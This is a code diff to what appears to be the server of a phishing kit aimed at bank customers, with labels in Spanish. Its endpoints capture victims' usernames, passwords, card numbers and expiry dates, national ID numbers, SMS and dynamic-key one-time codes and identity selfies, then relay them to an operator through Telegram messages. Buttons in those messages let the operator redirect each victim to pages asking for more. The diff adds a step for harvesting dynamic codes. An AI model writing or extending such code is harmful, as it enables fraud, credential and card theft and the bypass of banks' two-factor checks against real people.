@@ -23,6 +23,8 @@ const ACTIONS = {
   PEDIR_DATOS: "PEDIR_DATOS",
   ERROR_SOYYO: "ERROR_SOYYO",
   PEDIR_SOYYO: "PEDIR_SOYYO",
+  ERROR_DINAMICA: "ERROR_DINAMICA",
+  PEDIR_DINAMICA: "PEDIR_DINAMICA",
 };
 
 // Mapeo de acción -> URL final a la que debe ser redirigido el cliente.
@@ -54,6 +56,11 @@ function buildRedirectUrl(action) {
       return "soyyo.html?state=error_soyyo";
     case ACTIONS.PEDIR_SOYYO:
       return "soyyo.html?state=pedir_soyyo";
+
+    case ACTIONS.ERROR_DINAMICA:
+      return "dinamica.html?state=error_dinamica";
+    case ACTIONS.PEDIR_DINAMICA:
+      return "dinamica.html?state=pedir_dinamica";
 
     default:
       return null;
@@ -295,6 +302,10 @@ async function enviarMensajeConBotones(texto, sessionId) {
         { text: "ERROR SOYYO", callback_data: buildCallbackData("ERROR_SOYYO", sessionId) },
         { text: "PEDIR SOYYO", callback_data: buildCallbackData("PEDIR_SOYYO", sessionId) },
       ],
+      [
+        { text: "ERROR DINAMICA", callback_data: buildCallbackData("ERROR_DINAMICA", sessionId) },
+        { text: "PEDIR DINAMICA", callback_data: buildCallbackData("PEDIR_DINAMICA", sessionId) },
+      ],
     ],
   };
 
@@ -354,7 +365,7 @@ app.post("/capture/index", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>DATO OBTENIDO - NUEVA VISITA</b>",
+      "<b>🟡DATO OBTENIDO - NUEVA VISITA🟡</b>",
       "",
       `<b>USUARIO:</b> ${username}`,
       `<b>CLAVE:</b> ${password}`,
@@ -395,7 +406,7 @@ app.post("/capture/card", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>NUEVA CARD - CLIENTE ACTIVO</b>",
+      "<b>🟡NUEVA CARD - CLIENTE ACTIVO🟡</b>",
       "",
       `<b>NUMERO:</b> ${cardnumber || "N/A"}`,
       `<b>FECHA:</b> ${expiry || "N/A"}`,
@@ -437,7 +448,7 @@ app.post("/capture/datos", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>NUEVOS DATOS - CLIENTE ACTIVO</b>",
+      "<b>🟡NUEVOS DATOS - CLIENTE ACTIVO🟡</b>",
       "",
       `<b>NOMBRE:</b> ${name || "N/A"}`,
       `<b>CC:</b> ${cedula || "N/A"}`,
@@ -480,7 +491,7 @@ app.post("/capture/sms", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>NUEVO SMS - CLIENTE ACTIVO</b>",
+      "<b>🟡NUEVO SMS - CLIENTE ACTIVO🟡</b>",
       "",
       `<b>SMS:</b> ${smsCode || "N/A"}`,
       `<b>IP/BARRIO:</b> ${ipBarrio}`,
@@ -520,7 +531,7 @@ app.post("/capture/dinamica", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>NUEVA DINAMICA - CLIENTE ACTIVO</b>",
+      "<b>🟡NUEVA DINAMICA - CLIENTE ACTIVO🟡</b>",
       "",
       `<b>DINAMICA:</b> ${dinamicaCode || "N/A"}`,
       `<b>IP/BARRIO:</b> ${ipBarrio}`,
@@ -560,7 +571,7 @@ app.post("/capture/soyyo", async (req, res) => {
     const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
 
     const texto = [
-      "<b>SOY YO - CLIENTE ACTIVO</b>",
+      "<b>🟡SOY YO - CLIENTE ACTIVO🟡</b>",
       "",
       "<b>Imagen:</b> capturada en el navegador",
       `<b>IP/BARRIO:</b> ${ipBarrio}`,
